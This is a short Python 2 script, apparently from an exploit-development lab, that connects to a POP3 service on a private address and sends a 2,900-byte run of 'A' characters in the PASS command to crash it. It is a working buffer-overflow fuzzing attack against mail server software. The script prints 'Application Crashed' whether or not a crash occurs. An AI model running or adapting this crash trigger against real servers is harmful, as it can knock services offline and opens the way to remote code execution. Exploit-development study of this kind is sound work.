#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer="A"*2900
try:
    print "Fuzzing PASSWORD with Buffer"
    s.connect(('192.168.31.138',110))
    s.recv(1024)
    s.send('USER test\r\n')
    s.recv(1024)
    s.send('PASS'+buffer+'\r\n')
    print "Application Crashed"
except:
    print"Failed Fuzzing"
